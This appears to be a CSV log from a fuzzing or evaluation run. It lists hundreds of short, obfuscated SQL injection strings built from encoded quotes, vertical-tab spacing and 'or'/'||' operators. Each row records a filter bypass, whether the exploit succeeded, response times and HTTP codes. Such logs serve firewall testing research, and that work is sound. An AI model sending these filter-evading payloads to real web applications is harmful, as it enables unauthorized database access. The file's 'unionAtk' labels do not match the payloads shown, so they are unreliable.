Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.017,71.54,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0171,71.54,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0081,71.54,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0097,71.54,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0111,71.54,No,500
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0104,71.54,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0151,71.54,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0138,71.54,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0102,71.54,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.011,71.54,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0125,71.54,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0143,71.54,No,200
0%27or+1<@+||,Bypassed,Yes,unionAtk,Unknown,0.0158,71.54,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0151,71.54,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0108,71.54,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0218,71.54,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.022,71.54,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0211,71.54,No,200
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0091,71.54,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0094,71.54,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0195,71.54,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0169,71.54,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0288,71.54,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.013,71.54,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0135,71.54,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.018,71.54,No,500
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0174,71.54,No,500
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0236,71.54,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0239,71.54,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0192,71.54,No,200
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0164,71.54,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0177,71.54,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0154,71.54,No,200
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.0098,71.54,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0183,71.54,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0232,71.54,No,500
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0245,71.54,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0173,71.54,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0191,71.54,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0186,71.54,No,200
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0109,71.54,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0081,71.54,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0092,71.54,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0087,71.54,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.016,71.54,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0109,71.54,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0151,71.54,No,200
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,71.54,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0163,71.54,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0126,71.54,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0145,71.54,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0141,71.54,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0138,71.54,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.012,71.54,No,500
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0139,71.54,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0147,71.54,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0113,71.54,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0124,71.54,No,200
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0172,71.54,No,200
0'<@=1+||+,Bypassed,No,None,Unknown,0.0079,71.54,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0108,71.54,No,500
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0134,71.54,No,500
0%27or%0b@<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.0153,71.54,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0263,71.54,No,500
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0193,71.54,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0202,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0171,71.54,No,200
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.014,71.54,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.026,71.54,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0162,71.54,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0124,71.54,No,500
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0194,71.54,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0148,71.54,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0181,71.54,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0175,71.54,No,500
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0133,71.54,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0247,71.54,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0115,71.54,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0232,71.54,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0191,71.54,No,500
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0097,71.54,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.014,71.54,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0098,71.54,No,500
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0244,71.54,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0167,71.54,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.024,71.54,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0162,71.54,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0141,71.54,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.013,71.54,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0187,71.54,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0095,71.54,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0097,71.54,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0141,71.54,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0109,71.54,No,200
0'||%0b!@<@.+or,Bypassed,No,None,Unknown,0.0115,71.54,No,500
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0146,71.54,No,200
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0176,71.54,No,200
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0123,71.54,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0155,71.54,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0156,71.54,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0099,71.54,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0149,71.54,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.013,71.54,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0176,71.54,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0152,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0077,71.54,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0113,71.54,No,500
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0116,71.54,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0087,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0141,71.54,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0066,71.54,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0106,71.54,No,500
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0097,71.54,No,500
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0125,71.54,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0117,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0242,71.54,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0165,71.54,No,200
0'or%0b!@<@.%0bor,Bypassed,No,None,Unknown,0.0278,71.54,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0206,71.54,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0149,71.54,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,71.54,No,200
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0152,71.54,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0147,71.54,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0176,71.54,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0242,71.54,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0104,71.54,No,200
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.016,71.54,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0173,71.54,No,200
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0123,71.54,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0148,71.54,No,200
0%27or%0b!@<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.016,71.54,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0206,71.54,No,500
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0181,71.54,No,500
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0154,71.54,No,500
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0193,71.54,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0217,71.54,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0103,71.54,No,200
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0169,71.54,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0158,71.54,No,200
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0149,71.54,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0136,71.54,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0182,71.54,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.011,71.54,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0133,71.54,No,200
0'||%0b!@<@.%0bor,Bypassed,No,None,Unknown,0.01,71.54,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0111,71.54,No,500
0%27or%0b!@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0122,71.54,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0135,71.54,No,500
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0142,71.54,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0154,71.54,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0146,71.54,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0155,71.54,No,500
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0198,71.54,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0118,71.54,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0102,71.54,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0106,71.54,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.019,71.54,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0167,71.54,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0174,71.54,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0153,71.54,No,500
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0156,71.54,No,500
0'||%0b@<@.+||,Bypassed,No,None,Unknown,0.0178,71.54,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0172,71.54,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0232,71.54,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0243,71.54,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0271,71.54,No,500
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.016,71.54,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.016,71.54,No,200
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0106,71.54,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0177,71.54,No,500
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0263,71.54,No,500
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0153,71.54,No,500
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0278,71.54,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0185,71.54,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0162,71.54,No,500
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.017,71.54,No,200
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0163,71.54,No,200
0'or+@<@.+or,Bypassed,No,None,Unknown,0.023,71.54,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0133,71.54,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0104,71.54,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0138,71.54,No,200
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.0153,71.54,No,500
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0184,71.54,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.021,71.54,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0173,71.54,No,200
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0102,71.54,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0198,71.54,No,200
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0211,71.54,No,500
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0164,71.54,No,500
0%27or%0b@<@%0bor,Bypassed,Yes,unionAtk,Unknown,0.0105,71.54,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0131,71.54,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.01,71.54,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0128,71.54,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0116,71.54,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0094,71.54,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.01,71.54,No,200
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0156,71.54,No,200
0'or+@<@.%0bor,Bypassed,No,None,Unknown,0.0142,71.54,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0141,71.54,No,500
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0139,71.54,No,200
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0208,71.54,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0071,71.54,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.019,71.54,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0126,71.54,No,200
0'or+!@<@+||,Bypassed,No,None,Unknown,0.0152,71.54,No,500
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0156,71.54,No,500
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0138,71.54,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0115,71.54,No,500
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0141,71.54,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0154,71.54,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0214,71.54,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0155,71.54,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0166,71.54,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0226,71.54,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0167,71.54,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0122,71.54,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0205,71.54,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0158,71.54,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.01,71.54,No,500
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0172,71.54,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0183,71.54,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0121,71.54,No,500
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0237,71.54,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0209,71.54,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0071,71.54,No,500
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0137,71.54,No,200
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.0118,71.54,No,500
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0205,71.54,No,200
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0161,71.54,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.013,71.54,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0127,71.54,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0143,71.54,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0167,71.54,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0169,71.54,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0177,71.54,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.017,71.54,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0169,71.54,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0182,71.54,No,200
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0176,71.54,No,500
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0207,71.54,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0157,71.54,No,200
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0135,71.54,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0105,71.54,No,500
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0155,71.54,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0131,71.54,No,500
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0122,71.54,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0121,71.54,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0144,71.54,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0132,71.54,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0148,71.54,No,500
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0131,71.54,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0118,71.54,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.01,71.54,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0184,71.54,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.015,71.54,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0206,71.54,No,200
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.011,71.54,No,200
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0207,71.54,No,500
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0184,71.54,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0163,71.54,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.019,71.54,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0147,71.54,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0149,71.54,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0127,71.54,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0111,71.54,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0125,71.54,No,200
0'||%0b!@<@.%0b||,Bypassed,No,None,Unknown,0.0106,71.54,No,500
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0147,71.54,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0177,71.54,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0257,71.54,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0131,71.54,No,500
0'<@!=1%0bor%0b,Bypassed,No,None,Unknown,0.021,71.54,No,500
0'or%0b!@<@+or,Bypassed,No,None,Unknown,0.0185,71.54,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0215,71.54,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0219,71.54,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0153,71.54,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0207,71.54,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0158,71.54,No,200
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0207,71.54,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0124,71.54,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0189,71.54,No,500
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.022,71.54,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0214,71.54,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.019,71.54,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.013,71.54,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0102,71.54,No,500
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.0139,71.54,No,500
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0104,71.54,No,200
0'<@=1.+or%0b,Bypassed,No,None,Unknown,0.0144,71.54,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0135,71.54,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0127,71.54,No,500
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0146,71.54,No,500
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0172,71.54,No,500
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0129,71.54,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0063,71.54,No,500
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0128,71.54,No,200
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0123,71.54,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0119,71.54,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0137,71.54,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.02,71.54,No,500
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0115,71.54,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0088,71.54,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0143,71.54,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0147,71.54,No,200
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0226,71.54,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0107,71.54,No,200
0%27<@=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0257,71.54,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0099,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0115,71.54,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0196,71.54,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0175,71.54,No,200
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0256,71.54,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0136,71.54,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0203,71.54,No,200
